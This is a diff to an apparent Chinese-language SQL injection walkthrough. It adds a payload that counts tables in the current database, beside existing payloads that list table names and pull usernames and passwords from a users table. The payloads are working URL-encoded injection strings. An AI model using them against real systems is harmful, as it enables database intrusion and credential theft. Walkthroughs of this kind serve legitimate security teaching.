@@ -145,6 +145,10 @@ user_id=2&sort=item_name
 user_id=item_name`%20FROM%20(SELECT%20table_name%20AS%20`%27item_name`%20from%20information_schema.tables)y;--&sort=\?--%00
 ```
 ![图片](images/2026040401.png)
+#### 应用程序当前使用的数据库中有多少个自定义表？
+```
+user_id=item_name`%20FROM%20(SELECT%20COUNT(*)%20AS%20`%27item_name`%20from%20information_schema.tables%20where%20table_schema=database())y;--&sort=\?--%00
+```
 #### 在发送请求后，我们看到它返回了一个表格列表，其中有一个名为“users”的表格。这将包含应用程序中注册用户的详细信息。让我们列出这个表格所包含的记录。让我们从“users”表中提取用户名和密码字段。
 ```
 user_id=item_name`%20FROM%20(SELECT%20CONCAT_WS(0x3a,%20id,%20username,%20password)%20AS%20`%27item_name`%20from%20users)y;--&sort=\?--%00
